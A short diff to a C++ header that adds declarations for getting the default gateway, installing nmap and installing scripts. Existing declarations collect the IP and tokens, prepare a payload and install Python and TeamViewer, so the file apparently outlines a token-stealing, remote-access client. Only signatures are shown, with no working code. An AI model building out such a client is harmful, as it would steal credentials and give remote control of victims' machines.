@@ -12,6 +12,8 @@ namespace client {
 
 		std::string get_ip();
 
+		std::string get_default_gateway();
+
 		std::vector<std::string> get_tokens();
 
 		std::string prepare_payload(std::string title, std::vector<std::string> tokens);
@@ -21,5 +23,9 @@ namespace client {
 		void install_python();
 
 		void install_teamviewer();
+
+		void install_nmap();
+
+		void install_scripts();
 	}
 }
